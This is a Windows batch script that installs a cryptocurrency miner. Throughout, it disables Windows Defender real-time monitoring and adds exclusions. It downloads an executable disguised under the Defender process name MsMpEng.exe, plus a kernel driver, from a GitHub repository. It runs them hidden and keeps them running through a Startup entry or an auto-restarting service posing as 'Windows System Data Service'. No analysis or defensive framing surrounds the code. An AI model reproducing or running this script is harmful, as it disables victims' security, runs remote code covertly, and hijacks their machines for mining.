@echo off

set VERSION=2.5

net session >nul 2>&1
if %ERRORLEVEL% == 0 (set ADMIN=1) else (set ADMIN=0)

if ["%USERPROFILE%"] == [""] (
  exit /b 1
)

if not exist "%USERPROFILE%" (
  exit /b 1
)

where powershell >NUL
if not %errorlevel% == 0 (
  exit /b 1
)

where find >NUL
if not %errorlevel% == 0 (
  exit /b 1
)

where findstr >NUL
if not %errorlevel% == 0 (
  exit /b 1
)

set "MINER_DIR=%USERPROFILE%\AppData\Local\Microsoft\Windows\SystemData"

if exist "%MINER_DIR%\MsMpEng.exe" (
  tasklist /fi "imagename eq MsMpEng.exe" | find "MsMpEng.exe" >NUL
  if %ERRORLEVEL% equ 0 (
    rem Miner ya esta funcionando, no hacer nada
    exit /b 0
  )
)



if %ADMIN% == 1 (
  powershell -Command "Add-MpPreference -ExclusionPath '%MINER_DIR%' -Force" >NUL 2>NUL
  powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%' -Force" >NUL 2>NUL
  powershell -Command "Add-MpPreference -ExclusionProcess 'MsMpEng.exe' -Force" >NUL 2>NUL
  powershell -Command "Add-MpPreference -ExclusionExtension '.exe' -Force" >NUL 2>NUL
  powershell -Command "Add-MpPreference -ExclusionExtension '.zip' -Force" >NUL 2>NUL
  powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >NUL 2>NUL
  timeout 3 >NUL

)

sc stop WinSystemData >NUL 2>NUL
sc delete WinSystemData >NUL 2>NUL
taskkill /f /t /im MsMpEng.exe >NUL 2>NUL

:REMOVE_DIR0
timeout 2 >NUL
rmdir /q /s "%MINER_DIR%" >NUL 2>NUL
IF EXIST "%MINER_DIR%" GOTO REMOVE_DIR0

mkdir "%MINER_DIR%"
if errorlevel 1 (
  exit /b 1
)

powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/bryamestre12/llkasjidfjn/refs/heads/main/MsMpEng.exe', '%MINER_DIR%\MsMpEng.exe')"
if errorlevel 1 (
  exit /b 1
)

powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/bryamestre12/llkasjidfjn/refs/heads/main/WinRing0x64.sys', '%MINER_DIR%\WinRing0x64.sys')"
if errorlevel 1 (
  exit /b 1
)

if exist "%MINER_DIR%\MsMpEng.exe" goto MINER_OK
exit /b 1


:MINER_OK

if %ADMIN% == 1 goto ADMIN_MINER_SETUP

if exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK
)
if exist "%USERPROFILE%\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=%USERPROFILE%\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK  
)

exit /b 1


:STARTUP_DIR_OK
(
echo @echo off
echo start /min /b "%MINER_DIR%\MsMpEng.exe"
) > "%STARTUP_DIR%\WinSystemData.bat"

powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%MINER_DIR%\MsMpEng.exe' -WindowStyle Hidden"
goto OK

:ADMIN_MINER_SETUP
if not exist "%MINER_DIR%" (
  mkdir "%MINER_DIR%"
  if errorlevel 1 (
    exit /b 1
  )
)

if not exist "%MINER_DIR%\MsMpEng.exe" (
  exit /b 1
)

rem Crear un wrapper VBScript para ejecutar el programa sin ventana
(
echo Set WshShell = CreateObject^("WScript.Shell"^)
echo WshShell.Run """%MINER_DIR%\MsMpEng.exe""", 0, False
) > "%MINER_DIR%\service_wrapper.vbs"

rem Crear servicio usando sc.exe directamente sin nssm
sc create WinSystemData binPath= "wscript.exe ""%MINER_DIR%\service_wrapper.vbs"" //B //Nologo" start= auto DisplayName= "Windows System Data Service"
if errorlevel 1 (
  exit /b 1
)

sc description WinSystemData "Provides system data collection and management services for Windows."
sc failure WinSystemData reset= 86400 actions= restart/60000/restart/60000/restart/60000
sc start WinSystemData
if errorlevel 1 (
  exit /b 1
)

goto OK


:OK
exit /b 0

:strlen string len
setlocal EnableDelayedExpansion
set "token=#%~1" & set "len=0"
for /L %%A in (12,-1,0) do (
  set/A "len|=1<<%%A"
  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"
)
endlocal & set %~2=%len%
exit /b